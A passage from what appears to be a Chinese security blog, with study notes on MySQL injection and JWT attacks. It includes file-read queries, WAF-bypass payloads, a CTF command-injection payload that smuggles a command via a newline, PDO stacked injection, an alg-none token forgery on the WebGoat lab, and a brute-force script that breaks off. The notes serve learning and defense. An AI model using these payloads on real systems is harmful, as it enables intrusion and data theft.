class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端与服务端的mysql都是5.7版本</span><br></pre></td></tr></table></figure><p><code>mysql5.7</code>默认开启</p><p><img src="/../images/image-20230523163445312.png" alt="image-20230523163445312"></p><p>注：一开始使用服务端使用8版本不行</p><p>攻击者（服务端）起脚本</p><p><img src="/../images/image-20230523162503899.png" alt="image-20230523162503899"></p><p><img src="/../images/image-20230523162623757.png" alt="image-20230523162623757"></p><p>受害者连接</p><p><img src="/../images/image-20230523162534773.png" alt="image-20230523162534773"></p><p>攻击者查看<code>mysql.log</code></p><p><img src="/../images/image-20230523162727437.png" alt="image-20230523162727437"></p><h5 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a><code>load_file</code></h5><p><strong>注意：转义字符</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;e:\test.txt&#x27;); # \t 错误路径</span><br><span class="line">select load_file(&#x27;e:\\test.txt&#x27;);# 正确</span><br><span class="line">select load_file(0x653A5C746573742E747874);# 支持十六进制</span><br><span class="line">select load_file(char(101,58,92,116,101,115,116,46,116,120,116));# 支持char函数</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523134023401.png" alt="image-20230523134023401"></p><h5 id="load-data"><a href="#load-data" class="headerlink" title="load data "></a><code>load data </code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table user(cmd text)</span><br><span class="line">load data infile &#x27;e:/test.txt&#x27; into table user;</span><br><span class="line">select * from user;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523134532606.png" alt="image-20230523134532606"></p><p><img src="/../images/image-20230522220456619.png" alt="image-20230522220456619"></p><h4 id="mysqldump"><a href="#mysqldump" class="headerlink" title="mysqldump"></a>mysqldump</h4><p><strong>shell</strong>下执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases &gt; file_path  # 导出所有数据库</span><br><span class="line">mysqldump -uroot -proot --databases db1 --tables a1 a2  &gt; /file_path # 导出db1中的a1、a2表</span><br></pre></td></tr></table></figure><p>导出的文本内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建数据库判断语句-删除表-创建表-锁表-禁用索引-插入数据-启用索引-解锁表</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528204837541.png" alt="image-20230528204837541"></p><h5 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h5><p>CISCN2023初赛–dumpit</p><p>关键代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$black</span> = <span class="string">&#x27;;`*#^$&amp;|&#x27;</span>;  <span class="comment">#黑名单</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;db&#x27;</span>];</span><br><span class="line"><span class="variable">$t2d</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;table_2_dump&#x27;</span>];</span><br><span class="line"><span class="variable">$randstr</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$dump</span>=<span class="string">&#x27;mariadb-dump &#x27;</span>.<span class="variable">$db</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$t2d</span>.<span class="string">&#x27; &gt;./log/&#x27;</span>.<span class="variable">$randstr</span>.<span class="string">&#x27;.log&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$dump</span>);</span><br></pre></td></tr></table></figure><p>db和table都可控，过滤不严谨，并且直接拼接到命令中，造成RCE</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=flag2 %0d%0a cmd</span><br></pre></td></tr></table></figure><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>国光师傅✍的太好辣，等到后面学习windows提权再复现吧😋</p><p><a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><h4 id="Linux的Mysql–好像没用"><a href="#Linux的Mysql–好像没用" class="headerlink" title="Linux的Mysql–好像没用"></a>Linux的Mysql–好像没用</h4><p><code>help</code>查看<code>mysql</code>帮助</p><p><img src="/../images/image-20230522205545396.png" alt="image-20230522205545396"></p><p>假想：如果存在堆叠注入，就可以以当前数据库用户权限任意命令执行</p><p><img src="/../images/image-20230522205812501.png" alt="image-20230522205812501"></p><p>测试了一下好像不行</p><p><img src="/../images/image-20230522223047561.png" alt="image-20230522223047561"></p><p><strong>并且此方法只能在本地读取，远程连接mysql时使用system，实际上还是在原来的主机上执行命令。</strong></p><p><code>kali</code>连接远程mysql，<code>system uname -a</code></p><p><img src="/../images/image-20230522210207967.png" alt="image-20230522210207967"></p><h2 id="Mysql绕过补充"><a href="#Mysql绕过补充" class="headerlink" title="Mysql绕过补充"></a>Mysql绕过补充</h2><h3 id="通用绕过"><a href="#通用绕过" class="headerlink" title="通用绕过"></a>通用绕过</h3><ul><li><p>大小写绕过</p><p>修复：正则<code>/i</code></p></li><li><p>双写绕过（waf将关键字替换为空，且次数为1）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uniunionon</span><br></pre></td></tr></table></figure><p>修复：正则<code>/m</code></p></li></ul><h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 手动闭合</span><br><span class="line">$sql=&quot;select * from users where id=&#x27;$id&#x27;;&quot;</span><br><span class="line"></span><br><span class="line">$id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line"></span><br><span class="line">select * from users where id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;2&#x27;;</span><br></pre></td></tr></table></figure><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><ul><li><p><code>%0a</code></p></li><li><p><code>%0d%0a</code></p></li><li><p><code>/**/</code></p></li><li><p>括号绕过</p><blockquote><p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p></blockquote><p><img src="/../images/image-20230522161003063.png" alt="image-20230522161003063"></p></li></ul><h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><h4 id="不让用单引号"><a href="#不让用单引号" class="headerlink" title="不让用单引号"></a>不让用单引号</h4><p>可以用十六进制代替</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">where(table_name=&#x27;users&#x27;) → where(table_name=0x7573657273)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522163358530.png" alt="image-20230522163358530"></p><h4 id="转义了单引号"><a href="#转义了单引号" class="headerlink" title="转义了单引号"></a>转义了单引号</h4><p>宽字节注入，二次注入</p><h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)</span><br><span class="line"></span><br><span class="line">concat_ws(&quot;,&quot; , &quot;str1&quot; , &quot;str2&quot;)</span><br><span class="line"></span><br><span class="line">group_concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)</span><br></pre></td></tr></table></figure><h3 id="select绕过"><a href="#select绕过" class="headerlink" title="select绕过"></a>select绕过</h3><ul><li><p>已知表名可以用<code>handle</code></p></li><li><p>版本&gt;&#x3D;8.0</p><p><a href="https://blog.csdn.net/rfrder/article/details/118726022">mysql 8.0.21以上版本的新特性</a></p></li><li><p>在对当前表的列名注入时，可以直接写字段名，而无需<code>select 该字段 from 该表</code></p><p><img src="/../images/image-20230522161753632.png" alt="image-20230522161753632"></p></li></ul><h3 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(databse(),1,1) 等价于 substr(databse() from 1 for 1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3; 等价于 select * from (select 1)a join (select 2)b join (select 3)c;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220718092241142.png" alt="image-20220718092241142"></p><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 如果加了!就会执行在/* */内的语句</span><br><span class="line">/*!union select 1,2*/</span><br><span class="line"></span><br><span class="line"># 要将整个语句写入/* */内</span><br><span class="line">/*!union select */1,2 这是错误的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#  version 5.7.26</span><br><span class="line">/*!00000 select 1,2*/; 可以</span><br><span class="line">/*!50726 select 1,2*/;  可以</span><br><span class="line">/*!50727 select 1,2*/;  不可以</span><br><span class="line"></span><br><span class="line">00000 到 50726之间是可以的</span><br></pre></td></tr></table></figure><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p><code>information_schem</code>被过滤，不知道表的字段名</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>通过<code>select 数字</code>将字段名设置为数字</p><p><img src="/../images/image-20230523141619236.png" alt="image-20230523141619236"></p><p>再用联合查询将需要的数据存到上图的表中</p><p><img src="/../images/image-20230523141701416.png" alt="image-20230523141701416"></p><p>那么想要查询<code>users</code>表中的<code>username</code>字段的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `2` from (select 1,2,3 union select * from user)别名;</span><br><span class="line"></span><br><span class="line"># 别名是(select 1,2 union select * from user)返回的表的别名</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523141936080.png" alt="image-20230523141936080"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 如果反引号被过滤</span><br><span class="line">select group_concat(b) from (select 1,2 as b,3 union select * from users)a;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523142119240.png" alt="image-20230523142119240"></p><h2 id="预编译问题"><a href="#预编译问题" class="headerlink" title="预编译问题"></a>预编译问题</h2><p>推荐阅读：</p><p><a href="https://forum.butian.net/share/1559">奇安信攻防社区-SQL注入&amp;预编译</a></p><p><a href="https://xz.aliyun.com/t/3950">PDO场景下的SQL注入探究 - 先知社区</a></p><h3 id="预编译失效"><a href="#预编译失效" class="headerlink" title="预编译失效"></a>预编译失效</h3><p><code>PHP-PDO</code>采用本地预处理</p><p><img src="/../images/image-20230330172825283.png" alt="image-20230330172825283"></p><p>传入<code>?username=&#39;admin&#39;</code>,查看日志如下</p><blockquote><p>开启永久日志,在配置文件中加入</p><p>general_log &#x3D; 1<br>general_log_file &#x3D; 日志路径</p></blockquote><p><img src="/../images/image-20230330172741664.png" alt="image-20230330172741664"></p><p>可以看到预编译为其自动添加了一对引号，并将用户输入的引号进行转义。</p><p>那么如果将表名，<code>order by xx</code>处进行预编译就会产生如下效果</p><p><img src="/../images/image-20230330001720031.png" alt="image-20230330001720031"></p><p><img src="/../images/image-20230330001733787.png" alt="image-20230330001733787"></p><p>可以看到这些语句”失效了”（没有得到想要的结果），所以在实际开发中，对于这些语句大概率就是进行一个拼接处理，就很可能存在sql注入。</p><h3 id="预编译使用错误"><a href="#预编译使用错误" class="headerlink" title="预编译使用错误"></a>预编译使用错误</h3><ul><li><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">ThinkPHP5 SQL注入漏洞 &amp;&amp; PDO真&#x2F;伪预处理分析 | 离别歌</a></p></li><li><p>堆叠注入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment"># 预处理语句</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select * from users where id=<span class="subst">$id</span>&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$fraction</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$fraction</span>);</span><br></pre></td></tr></table></figure><p>使用模拟预编译，并且没有绑定参数</p><p>又因为PDO默认可以支持多条SQL执行，所有造成了堆叠注入。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1;create database pdo;</span><br></pre></td></tr></table></figure><p>  <img src="/../images/image-20230523131701820.png" alt="image-20230523131701820"></p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sqlmap 源码分析</p><p><img src="/../images/routine.png" alt="img"></p><ul><li><p><a href="https://www.anquanke.com/post/id/262848">sqlmap 项目剖析1</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262847">sqlmap 项目剖析2</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262849">sqlmap 项目剖析3</a></p><p>sqlmap 使用一种极其巧妙的方式组合生成一个完整的 payload，一个完整的 payload 由如下几个部分组成：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">prefix</span>&gt;</span> <span class="tag">&lt;<span class="name">test</span>&gt;</span> <span class="tag">&lt;<span class="name">comment</span>&gt;</span> <span class="tag">&lt;<span class="name">suffix</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 prefix、comment、suffix 作为 boundary，boundary 用于闭合注入点的前后部分；test 则是最终如果闭合成功后必然执行的语句。</p><p>因此 sqlmap 将 prefix 与 suffix 单独作为 boundaries 保存，而 test 和 comment 则根据注入方式和数据库的不同被划分为六个文件（路径：<code>/data/xml/payloads</code>）</p><p><img src="/../images/t01d7dbc46705981404.jpg" alt="img"></p></li><li><p><a href="https://www.anquanke.com/post/id/262850">sqlmap 项目剖析4</a></p><p>布尔注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先发送一个 false 请求，如果结果与原页面相同就判断不存在布尔注入</span><br><span class="line">如果不相同发送一个 true 请求,如果与原页面相似</span><br><span class="line">则再发送一个 false 请求，然后把这两次返回的结果取差集，计算出True时的flag标识，也就是sqlmap的-string参数</span><br></pre></td></tr></table></figure><p>报错注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发送报错payload，如果能够正则匹配到则说明存在报错注入。</span><br></pre></td></tr></table></figure><p>延时注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先发送N个正常请求，然后计算这N个请求响应时间的标准差和正常请求的最长响应时间</span><br><span class="line">然后发送一个延时请求，判断是否在区间内</span><br></pre></td></tr></table></figure><p><img src="/../images/10.png" alt="img"></p><p>联合查询注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用order by和二分法来判断列数</span><br><span class="line">遍历列数判断哪一列是回显点</span><br><span class="line">发送payload</span><br></pre></td></tr></table></figure></li><li><p><a href="https://www.beysec.com/security/sqlmap-source-1.html">sqlmap源码分析与学习</a></p></li><li><p><a href="https://www.processon.com/view/5835511ce4b0620292bd7285">sqlmap 流程脑图</a></p></li></ul><p>os-shell 原理</p><ul><li><a href="https://xz.aliyun.com/t/7942">sqlmap –os-shell原理</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&mid=2247485339&idx=1&sn=ea76ee0d56b8a95a118a60d111d48160">Sqlmap之os-shell原理分析</a></li></ul><p>攻防</p><ul><li><a href="https://xz.aliyun.com/t/10385">实战sqlmap绕过WAF</a></li><li><a href="https://www.anquanke.com/post/id/261915">sqlmap –os-shell反制小思路</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247494179&idx=1&sn=e6c94b87981fda009e7be50c9eb73bf6">入侵检测之sqlmap恶意流量分析</a></li></ul><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ul><li><p>正确使用预编译+黑名单</p></li><li><p>配置问题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  站库分离</span><br><span class="line">  不允许外连</span><br><span class="line">  数据库以低权限运行</span><br><span class="line">  不显示报错</span><br><span class="line">  不使用多语句查询</span><br><span class="line">  secure_file_priv=NULL</span><br><span class="line">字符集保持一致</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JWT安全</title>
      <link href="/2023/06/01/JWT%E4%BB%A4%E7%89%8C/"/>
      <url>/2023/06/01/JWT%E4%BB%A4%E7%89%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="JWT认识"><a href="#JWT认识" class="headerlink" title="JWT认识"></a>JWT认识</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>JSON Web Token（JSON Web 令牌）是一种跨域验证身份的方案。JWT 不加密传输的数据，但能够通过数字签名来验证数据未被篡改。</p><h2 id="令牌工作流程"><a href="#令牌工作流程" class="headerlink" title="令牌工作流程"></a>令牌工作流程</h2><p><img src="/../images/jwt-diagram.png" alt="jwt"></p><ol><li>浏览器发起请求登陆</li><li>服务端验证身份，根据算法，将用户标识符打包生成 token, 并且返回给浏览器</li><li>浏览器发起请求获取用户资料，把刚刚拿到的 token 一起发送给服务器</li><li>服务器发现数据中有 token，验证签名并识别用户身份</li><li>服务器返回该用户的用户资料</li></ol><h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p>JWT 分为三部分，头部（Header），声明（Claims），签名（Signature），三个部分以英文句号.隔开。 </p><p><img src="/../images/jwt_token.png" alt="JWT"></p><p>hearder和Claims 的内容以 Base64URL 进行了编码。</p><blockquote><p>Base64URL  From 维基百科</p></blockquote><p><img src="/../images/image-20230607163309054.png" alt="image-20230607163309054"></p><h3 id="头部（Header）"><a href="#头部（Header）" class="headerlink" title="头部（Header）"></a>头部（Header）</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span><span class="string">&quot;webgoat_key&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>参数说明:</p><ul><li>algorithm（alg） :说明JWT签名使用的算法，常见有HS256（默认），RS256 等，也可以为 None不进行签名。</li><li>kid：用来指定验证签名的密钥</li><li>typ:说明这个 token 的类型为 JWT (可选参数)</li></ul><h3 id="声明（Claims）"><a href="#声明（Claims）" class="headerlink" title="声明（Claims）"></a>声明（Claims）</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line"> <span class="attr">&quot;secretid&quot;</span><span class="punctuation">:</span><span class="string">&quot; &quot;</span></span><br><span class="line"> <span class="attr">&quot;aud&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webgoat.org&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1644039735</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1644039795</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tom@webgoat.org&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span>xxx</span><br><span class="line"><span class="punctuation">&#125;</span> </span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>secretid：密钥id值，当其为空时，jwt默认alg为none</li><li>aud：接收jwt的用户</li><li>iat：令牌生效时间 </li><li>exp：令牌到期时间</li><li>sub：主题</li><li>jti： jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击</li><li>nbf：定义在什么时间之前，该jwt都是不可用的.</li></ul><p> 文档：<a href="https://datatracker.ietf.org/doc/html/rfc7519#section-4.1">https://datatracker.ietf.org/doc/html/rfc7519#section-4.1</a></p><h3 id="签名（Signature）"><a href="#签名（Signature）" class="headerlink" title="签名（Signature）"></a>签名（Signature）</h3><p>​服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容（base64编码后的）用此密码进行加密，生成的字符串就是 JWT 的签名。 </p><p>以HMAC SHA256为例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> + base64UrlEncode(claims),secret)</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>在http header中添加</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure><h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><ul><li><p>防篡改取决于私钥和加密算法的安全性。</p></li><li><p>因为签名所以JWT能够防篡改起到认证功能，但是对于header和Claims部分只进行了base64URL编码，这意味着任何人都可以读取到这部分的信息，所以除非加密，否则不要在JWT的有效负载或报头元素中放置秘密信息。</p></li></ul><h1 id="如何生成JWT"><a href="#如何生成JWT" class="headerlink" title="如何生成JWT"></a>如何生成JWT</h1><ul><li><p>签名解析网站 <a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p></li><li><p>python</p><p>安装模块</p><p><a href="https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode">https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip uninstall JWT </span><br><span class="line">pip uninstall PyJWT </span><br><span class="line">pip install PyJWT==<span class="number">1.7</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 调用jwt库,生成json web token</span></span><br><span class="line">jwt_token = jwt.encode(payload=payload,  <span class="comment"># payload, 有效载体</span></span><br><span class="line">                       key=key,  <span class="comment"># 进行加密签名的密钥</span></span><br><span class="line">                       algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># 指明签名算法方式, 默认也是HS256</span></span><br><span class="line">                       headers=headers  <span class="comment"># json web token 数据结构包含两部分, payload(有效载体), headers(标头)</span></span><br><span class="line">                       ).decode(<span class="string">&#x27;ascii&#x27;</span>)  <span class="comment"># python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str</span></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br></pre></td></tr></table></figure></li></ul><h1 id="JWT检测"><a href="#JWT检测" class="headerlink" title="JWT检测"></a>JWT检测</h1><ul><li><p>JAVAweb</p></li><li><p>数据包请求头</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer</span><br></pre></td></tr></table></figure></li><li><p>数据包数据格式</p></li></ul><h1 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h1><h3 id="签名算法置None"><a href="#签名算法置None" class="headerlink" title="签名算法置None"></a>签名算法置None</h3><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>WebGoat JWT 5</p><p><img src="/../images/image-20230607173309475.png" alt="image-20230607173309475"></p><p>点击reset按钮，抓取数据包，将数据包中的token进行解密</p><p><img src="/../images/image-20230607173408930.png" alt="image-20230607173408930"></p><p>发现在声明部分有admin参数值为false，应该就是根据这个来判断用户是否为管理员</p><p><strong>将admin值修改为true</strong></p><p>这时候修改了声明部分的内容，签名就失效了，所以要绕过签名验证</p><p><strong>将头部alg值改为none，让服务器不进行签名验证</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1686993728</span>,</span><br><span class="line">  <span class="string">&quot;admin&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">  <span class="string">&quot;user&quot;</span>: <span class="string">&quot;Jerry&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">,algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607174127468.png" alt="image-20230607174127468"></p><h4 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br><span class="line">   <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line">   <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">   <span class="type">boolean</span> <span class="variable">isAdmin</span> <span class="operator">=</span> Boolean.valueOf((String) claims.get(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">   <span class="keyword">if</span> (isAdmin) &#123;</span><br><span class="line">     removeAllUsers();</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     log.error(<span class="string">&quot;You are not an admin user&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidTokenException</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键点在于</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br></pre></td></tr></table></figure><p>使用了错误的函数<code>parse(accessToken)</code>，而不是<code>parseClaimsJws(accessToken)</code>，导致jwt验证成功</p><p>正常情况下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parseClaimsJws(accessToken);</span><br></pre></td></tr></table></figure><ul><li><code>Jwts.parser()</code> 创建了一个<code>JwtParser</code>类的实例，用于解析和验证JWT。</li><li><code>setSigningKey(JWT_PASSWORD)</code> 设置用于签名JWT的密钥。<code>JWT_PASSWORD</code>变量应包含用于签名JWT的相同密钥。</li><li><code>parseClaimsJws(accessToken)</code> 解析包含在<code>accessToken</code>变量中的JWT，并将其作为<code>Jws&lt;Claims&gt;</code>对象返回。<code>Claims</code>对象包含JWT的有效负载，通常包括关于用户的信息以及授权请求所需的任何其他数据。</li></ul><p>需要注意的是，如果使用提供的密钥无法验证JWT，则<code>parseClaimsJws()</code>方法将抛出<code>SignatureException</code>。</p><h3 id="爆破密钥–修改签名"><a href="#爆破密钥–修改签名" class="headerlink" title="爆破密钥–修改签名"></a>爆破密钥–修改签名</h3><p>WebGoat JWT 10</p><p>工具</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./jwtcrack JWT数据</span><br><span class="line">hashcat</span><br></pre></td></tr></table></figure><p>python脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    1.若签名直接校验成功，则 key_ 为有效密钥；</span></span><br><span class="line"><span class="string">    2.若因数据部分预定义字段错误（jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError）导致校验失败，说明并非密钥错误导致，则 key_ 也为有效密钥；</span></span><br><span class="line"><span class="string">    3.若因密钥错误（jwt.exceptions.InvalidSignatureError）导致校验失败，则 key_ 为无效密钥；</span></span><br><span class="line"><span class="string">    4.若为其他原因（如，JWT 字符串格式错误）导致校验失败，根本无法验证当前 key_ 是否有效。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="comment">#import termcolor</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 提示里给的字典https://github.com/first20hours/google-10000-english</span></span><br><span class="line">dict_path = <span 